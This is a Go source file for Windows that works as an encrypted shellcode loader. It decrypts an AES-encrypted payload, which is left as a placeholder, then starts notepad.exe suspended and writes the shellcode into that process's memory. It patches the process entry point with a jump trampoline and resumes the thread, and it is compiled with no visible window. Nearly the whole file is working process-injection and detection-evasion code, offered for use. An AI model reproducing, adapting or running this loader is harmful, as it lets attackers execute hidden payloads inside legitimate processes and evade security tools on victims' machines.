//go:build windows
// +build windows

//go 1.19.5

//no cmd pop-up
//go build -ldflags -H=windowsgui filename.go

package main

import (
	_ "embed"
	"encoding/binary"
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"syscall"
	"unsafe"

	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"

	//"encoding/hex"
	"errors"

	"github.com/golang/glog"

	// Sub Repositories
	"golang.org/x/sys/windows"
)

// IsEncryptionOn : A simple system for turning on and off encryption in case you need to see the plain text results in a database for testing (default is On)
var IsEncryptionOn = true

// DecryptBase64StringToString : AES256 decryption function to work with strings
// (depends on DecryptByteArray)
func DecryptBase64StringToString(key, base64StringToDecrypt string) (decodedString string, err error) {
	if IsEncryptionOn == false {
		return base64StringToDecrypt, nil
	}
	keyBytes := []byte(key)
	stringToDecryptBytes, err := base64.StdEncoding.DecodeString(base64StringToDecrypt)
	if err != nil {
		glog.Error(err)
		return "", err
	}
	decryptedByteArray, err := DecryptByteArray(keyBytes, stringToDecryptBytes)
	decryptedString := string(decryptedByteArray[:len(decryptedByteArray)])
	return decryptedString, err
}

// DecryptByteArray : AES256 encryption function to work with byte arrays
func DecryptByteArray(key, byteArrayToDecrypt []byte) ([]byte, error) {
	if IsEncryptionOn {
		block, err := aes.NewCipher(key)
		if err != nil {
			return nil, err
		}
		if len(byteArrayToDecrypt) < aes.BlockSize {
			return nil, errors.New("ciphertext too short")
		}
		iv := byteArrayToDecrypt[:aes.BlockSize]
		byteArrayToDecrypt = byteArrayToDecrypt[aes.BlockSize:]
		cfb := cipher.NewCFBDecrypter(block, iv)
		cfb.XORKeyStream(byteArrayToDecrypt, byteArrayToDecrypt)
		return byteArrayToDecrypt, nil
	}
	return byteArrayToDecrypt, nil
}

func Use(vals ...interface{}) {
	for _, val := range vals {
		_ = val
	}
}

var runes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'.!@#$%^&*(){},=-;+")
var keyLength = 32

//go:embed file-go
var s []byte

func main() {
	fmt.Println("Starting encryption.")

	key := "PLACE-KEY-HERE" //32 chars long
	fmt.Println("Key = %s.", key)

	Use(s)
	encodedString2, _ := hex.DecodeString("PLACE-SHELLCODE-HERE")
	shellcode, err := DecryptByteArray([]byte(key), encodedString2)

	if err != nil {
		fmt.Println("Could not decrypt the string: %s", err.Error())
	}

	// Load DLLs and Procedures
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")

	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	NtQueryInformationProcess := ntdll.NewProc("NtQueryInformationProcess")

	program := flag.String("program", "C:\\Windows\\System32\\notepad.exe", "The program to start and inject shellcode into")
	//program := flag.String("program", "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", "The program to start and inject shellcode into")

	procInfo := &windows.ProcessInformation{}
	startupInfo := &windows.StartupInfo{
		Flags:      windows.STARTF_USESTDHANDLES | windows.CREATE_SUSPENDED,
		ShowWindow: 1,
	}
	errCreateProcess := windows.CreateProcess(syscall.StringToUTF16Ptr(*program), nil, nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, startupInfo, procInfo)
	if errCreateProcess != nil && errCreateProcess.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling CreateProcess:\r\n%s", errCreateProcess.Error()))
	}

	// Allocate memory in child process
	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(procInfo.Process), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)

	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error()))
	}

	if addr == 0 {
		log.Fatal("[!]VirtualAllocEx failed and returned 0")
	}

	// Write shellcode into child process memory
	_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(procInfo.Process), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	if errWriteProcessMemory != nil && errWriteProcessMemory.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling WriteProcessMemory:\r\n%s", errWriteProcessMemory.Error()))
	}

	// Change memory permissions to RX in child process where shellcode was written
	oldProtect := windows.PAGE_READWRITE
	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(procInfo.Process), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtectEx != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling VirtualProtectEx:\r\n%s", errVirtualProtectEx.Error()))
	}

	type PEB struct {
		//reserved1              [2]byte     // BYTE 0-1
		InheritedAddressSpace    byte        // BYTE	0
		ReadImageFileExecOptions byte        // BYTE	1
		BeingDebugged            byte        // BYTE	2
		reserved2                [1]byte     // BYTE 3
		Mutant                   uintptr     // BYTE 4
		ImageBaseAddress         uintptr     // BYTE 8
		Ldr                      uintptr     // PPEB_LDR_DATA
		ProcessParameters        uintptr     // PRTL_USER_PROCESS_PARAMETERS
		reserved4                [3]uintptr  // PVOID
		AtlThunkSListPtr         uintptr     // PVOID
		reserved5                uintptr     // PVOID
		reserved6                uint32      // ULONG
		reserved7                uintptr     // PVOID
		reserved8                uint32      // ULONG
		AtlThunkSListPtr32       uint32      // ULONG
		reserved9                [45]uintptr // PVOID
		reserved10               [96]byte    // BYTE
		PostProcessInitRoutine   uintptr     // PPS_POST_PROCESS_INIT_ROUTINE
		reserved11               [128]byte   // BYTE
		reserved12               [1]uintptr  // PVOID
		SessionId                uint32      // ULONG
	}

	type PROCESS_BASIC_INFORMATION struct {
		reserved1                    uintptr    // PVOID
		PebBaseAddress               uintptr    // PPEB
		reserved2                    [2]uintptr // PVOID
		UniqueProcessId              uintptr    // ULONG_PTR
		InheritedFromUniqueProcessID uintptr    // PVOID
	}

	var processInformation PROCESS_BASIC_INFORMATION
	var returnLength uintptr
	ntStatus, _, errNtQueryInformationProcess := NtQueryInformationProcess.Call(uintptr(procInfo.Process), 0, uintptr(unsafe.Pointer(&processInformation)), unsafe.Sizeof(processInformation), returnLength)
	if errNtQueryInformationProcess != nil && errNtQueryInformationProcess.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling NtQueryInformationProcess:\r\n\t%s", errNtQueryInformationProcess.Error()))
	}
	if ntStatus != 0 {
		if ntStatus == 3221225476 {
			log.Fatal("[!]Error calling NtQueryInformationProcess: STATUS_INFO_LENGTH_MISMATCH") // 0xc0000004 (3221225476)
		}
		fmt.Println(fmt.Sprintf("[!]NtQueryInformationProcess returned NTSTATUS: %x(%d)", ntStatus, ntStatus))
		log.Fatal(fmt.Sprintf("[!]Error calling NtQueryInformationProcess:\r\n\t%s", syscall.Errno(ntStatus)))
	}

	ReadProcessMemory := kernel32.NewProc("ReadProcessMemory")

	var peb PEB
	var readBytes int32

	_, _, errReadProcessMemory := ReadProcessMemory.Call(uintptr(procInfo.Process), processInformation.PebBaseAddress, uintptr(unsafe.Pointer(&peb)), unsafe.Sizeof(peb), uintptr(unsafe.Pointer(&readBytes)))
	if errReadProcessMemory != nil && errReadProcessMemory.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling ReadProcessMemory:\r\n\t%s", errReadProcessMemory.Error()))
	}

	// Read the child program's DOS header and validate it is a MZ executable
	type IMAGE_DOS_HEADER struct {
		Magic    uint16     // USHORT Magic number
		Cblp     uint16     // USHORT Bytes on last page of file
		Cp       uint16     // USHORT Pages in file
		Crlc     uint16     // USHORT Relocations
		Cparhdr  uint16     // USHORT Size of header in paragraphs
		MinAlloc uint16     // USHORT Minimum extra paragraphs needed
		MaxAlloc uint16     // USHORT Maximum extra paragraphs needed
		SS       uint16     // USHORT Initial (relative) SS value
		SP       uint16     // USHORT Initial SP value
		CSum     uint16     // USHORT Checksum
		IP       uint16     // USHORT Initial IP value
		CS       uint16     // USHORT Initial (relative) CS value
		LfaRlc   uint16     // USHORT File address of relocation table
		Ovno     uint16     // USHORT Overlay number
		Res      [4]uint16  // USHORT Reserved words
		OEMID    uint16     // USHORT OEM identifier (for e_oeminfo)
		OEMInfo  uint16     // USHORT OEM information; e_oemid specific
		Res2     [10]uint16 // USHORT Reserved words
		LfaNew   int32      // LONG File address of new exe header
	}

	var dosHeader IMAGE_DOS_HEADER
	var readBytes2 int32

	_, _, errReadProcessMemory2 := ReadProcessMemory.Call(uintptr(procInfo.Process), peb.ImageBaseAddress, uintptr(unsafe.Pointer(&dosHeader)), unsafe.Sizeof(dosHeader), uintptr(unsafe.Pointer(&readBytes2)))
	if errReadProcessMemory2 != nil && errReadProcessMemory2.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling ReadProcessMemory:\r\n\t%s", errReadProcessMemory2.Error()))
	}

	if dosHeader.Magic != 23117 {
		log.Fatal(fmt.Sprintf("[!]DOS image header magic string was not MZ"))
	}

	// Read the child process's PE header signature to validate it is a PE
	var Signature uint32
	var readBytes3 int32

	_, _, errReadProcessMemory3 := ReadProcessMemory.Call(uintptr(procInfo.Process), peb.ImageBaseAddress+uintptr(dosHeader.LfaNew), uintptr(unsafe.Pointer(&Signature)), unsafe.Sizeof(Signature), uintptr(unsafe.Pointer(&readBytes3)))
	if errReadProcessMemory3 != nil && errReadProcessMemory3.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling ReadProcessMemory:\r\n\t%s", errReadProcessMemory3.Error()))
	}

	if Signature != 17744 {
		log.Fatal("[!]PE Signature string was not PE")
	}

	type IMAGE_FILE_HEADER struct {
		Machine              uint16
		NumberOfSections     uint16
		TimeDateStamp        uint32
		PointerToSymbolTable uint32
		NumberOfSymbols      uint32
		SizeOfOptionalHeader uint16
		Characteristics      uint16
	}

	var peHeader IMAGE_FILE_HEADER
	var readBytes4 int32

	_, _, errReadProcessMemory4 := ReadProcessMemory.Call(uintptr(procInfo.Process), peb.ImageBaseAddress+uintptr(dosHeader.LfaNew)+unsafe.Sizeof(Signature), uintptr(unsafe.Pointer(&peHeader)), unsafe.Sizeof(peHeader), uintptr(unsafe.Pointer(&readBytes4)))
	if errReadProcessMemory4 != nil && errReadProcessMemory4.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling ReadProcessMemory:\r\n\t%s", errReadProcessMemory4.Error()))
	}

	type IMAGE_OPTIONAL_HEADER64 struct {
		Magic                       uint16
		MajorLinkerVersion          byte
		MinorLinkerVersion          byte
		SizeOfCode                  uint32
		SizeOfInitializedData       uint32
		SizeOfUninitializedData     uint32
		AddressOfEntryPoint         uint32
		BaseOfCode                  uint32
		ImageBase                   uint64
		SectionAlignment            uint32
		FileAlignment               uint32
		MajorOperatingSystemVersion uint16
		MinorOperatingSystemVersion uint16
		MajorImageVersion           uint16
		MinorImageVersion           uint16
		MajorSubsystemVersion       uint16
		MinorSubsystemVersion       uint16
		Win32VersionValue           uint32
		SizeOfImage                 uint32
		SizeOfHeaders               uint32
		CheckSum                    uint32
		Subsystem                   uint16
		DllCharacteristics          uint16
		SizeOfStackReserve          uint64
		SizeOfStackCommit           uint64
		SizeOfHeapReserve           uint64
		SizeOfHeapCommit            uint64
		LoaderFlags                 uint32
		NumberOfRvaAndSizes         uint32
		DataDirectory               uintptr
	}

	type IMAGE_OPTIONAL_HEADER32 struct {
		Magic                       uint16
		MajorLinkerVersion          byte
		MinorLinkerVersion          byte
		SizeOfCode                  uint32
		SizeOfInitializedData       uint32
		SizeOfUninitializedData     uint32
		AddressOfEntryPoint         uint32
		BaseOfCode                  uint32
		BaseOfData                  uint32 // Different from 64 bit header
		ImageBase                   uint64
		SectionAlignment            uint32
		FileAlignment               uint32
		MajorOperatingSystemVersion uint16
		MinorOperatingSystemVersion uint16
		MajorImageVersion           uint16
		MinorImageVersion           uint16
		MajorSubsystemVersion       uint16
		MinorSubsystemVersion       uint16
		Win32VersionValue           uint32
		SizeOfImage                 uint32
		SizeOfHeaders               uint32
		CheckSum                    uint32
		Subsystem                   uint16
		DllCharacteristics          uint16
		SizeOfStackReserve          uint64
		SizeOfStackCommit           uint64
		SizeOfHeapReserve           uint64
		SizeOfHeapCommit            uint64
		LoaderFlags                 uint32
		NumberOfRvaAndSizes         uint32
		DataDirectory               uintptr
	}

	var optHeader64 IMAGE_OPTIONAL_HEADER64
	var optHeader32 IMAGE_OPTIONAL_HEADER32
	var errReadProcessMemory5 error
	var readBytes5 int32

	if peHeader.Machine == 34404 { // 0x8664
		_, _, errReadProcessMemory5 = ReadProcessMemory.Call(uintptr(procInfo.Process), peb.ImageBaseAddress+uintptr(dosHeader.LfaNew)+unsafe.Sizeof(Signature)+unsafe.Sizeof(peHeader), uintptr(unsafe.Pointer(&optHeader64)), unsafe.Sizeof(optHeader64), uintptr(unsafe.Pointer(&readBytes5)))
	} else if peHeader.Machine == 332 { // 0x14c
		_, _, errReadProcessMemory5 = ReadProcessMemory.Call(uintptr(procInfo.Process), peb.ImageBaseAddress+uintptr(dosHeader.LfaNew)+unsafe.Sizeof(Signature)+unsafe.Sizeof(peHeader), uintptr(unsafe.Pointer(&optHeader32)), unsafe.Sizeof(optHeader32), uintptr(unsafe.Pointer(&readBytes5)))
	} else {
		log.Fatal(fmt.Sprintf("[!]Unknow IMAGE_OPTIONAL_HEADER type for machine type: 0x%x", peHeader.Machine))
	}

	if errReadProcessMemory5 != nil && errReadProcessMemory5.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling ReadProcessMemory:\r\n\t%s", errReadProcessMemory5.Error()))
	}

	// Overwrite the value at AddressofEntryPoint field with trampoline to load the shellcode address in RAX/EAX and jump to it
	var ep uintptr
	if peHeader.Machine == 34404 { // 0x8664 x64
		ep = peb.ImageBaseAddress + uintptr(optHeader64.AddressOfEntryPoint)
	} else if peHeader.Machine == 332 { // 0x14c x86
		ep = peb.ImageBaseAddress + uintptr(optHeader32.AddressOfEntryPoint)
	} else {
		log.Fatal(fmt.Sprintf("[!]Unknow IMAGE_OPTIONAL_HEADER type for machine type: 0x%x", peHeader.Machine))
	}

	var epBuffer []byte
	var shellcodeAddressBuffer []byte
	// x86 - 0xb8 = mov eax
	// x64 - 0x48 = rex (declare 64bit); 0xb8 = mov eax
	if peHeader.Machine == 34404 { // 0x8664 x64
		epBuffer = append(epBuffer, byte(0x48))
		epBuffer = append(epBuffer, byte(0xb8))
		shellcodeAddressBuffer = make([]byte, 8) // 8 bytes for 64-bit address
		binary.LittleEndian.PutUint64(shellcodeAddressBuffer, uint64(addr))
		epBuffer = append(epBuffer, shellcodeAddressBuffer...)
	} else if peHeader.Machine == 332 { // 0x14c x86
		epBuffer = append(epBuffer, byte(0xb8))
		shellcodeAddressBuffer = make([]byte, 4) // 4 bytes for 32-bit address
		binary.LittleEndian.PutUint32(shellcodeAddressBuffer, uint32(addr))
		epBuffer = append(epBuffer, shellcodeAddressBuffer...)
	} else {
		log.Fatal(fmt.Sprintf("[!]Unknow IMAGE_OPTIONAL_HEADER type for machine type: 0x%x", peHeader.Machine))
	}

	// 0xff ; 0xe0 = jmp [r|e]ax
	epBuffer = append(epBuffer, byte(0xff))
	epBuffer = append(epBuffer, byte(0xe0))

	_, _, errWriteProcessMemory2 := WriteProcessMemory.Call(uintptr(procInfo.Process), ep, uintptr(unsafe.Pointer(&epBuffer[0])), uintptr(len(epBuffer)))

	if errWriteProcessMemory2 != nil && errWriteProcessMemory2.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling WriteProcessMemory:\r\n%s", errWriteProcessMemory2.Error()))
	}

	// Resume the child process
	_, errResumeThread := windows.ResumeThread(procInfo.Thread)
	if errResumeThread != nil {
		log.Fatal(fmt.Sprintf("[!]Error calling ResumeThread:\r\n%s", errResumeThread.Error()))
	}

	// Close the handle to the child process
	errCloseProcHandle := windows.CloseHandle(procInfo.Process)
	if errCloseProcHandle != nil {
		log.Fatal(fmt.Sprintf("[!]Error closing the child process handle:\r\n\t%s", errCloseProcHandle.Error()))
	}

	// Close the hand to the child process thread
	errCloseThreadHandle := windows.CloseHandle(procInfo.Thread)
	if errCloseThreadHandle != nil {
		log.Fatal(fmt.Sprintf("[!]Error closing the child process thread handle:\r\n\t%s", errCloseThreadHandle.Error()))
	}

}
